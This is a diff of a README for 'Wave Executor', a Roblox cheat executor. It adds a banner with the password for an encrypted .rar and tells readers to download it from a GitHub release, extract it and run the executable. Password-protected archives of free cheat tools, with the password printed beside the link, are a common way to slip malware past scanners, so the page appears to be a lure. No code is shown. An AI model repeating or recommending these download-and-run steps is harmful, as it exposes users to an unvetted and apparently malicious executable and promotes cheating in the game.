@@ -6,6 +6,8 @@ Unlock new possibilities in Roblox with **Wave Executor** — a powerful and mod
 
 👉 [Get the Latest Version](https://github.com/HesSkull/WaveLauncher/releases/tag/roblox)  
 
+# 🔑The password for the archive is WaveFREE🔑
+
 ---  
 
 ## 💡 About the Project  
@@ -26,7 +28,7 @@ Unlock new possibilities in Roblox with **Wave Executor** — a powerful and mod
 ## 🚀 Quick Start Guide  
 
 1. **Download** the latest version from [here](https://github.com/HesSkull/WaveLauncher/releases/download/roblox/WaveLauncher.rar).  
-2. **Extract & Run** the executable file.  __**(The password for the archive is WaveFREE)**__
+2. **Extract & Run** the executable file.  **(The password for the archive is WaveFREE)**
 3. **Launch Roblox** and inject the executor to start scripting.  
 
 ---  
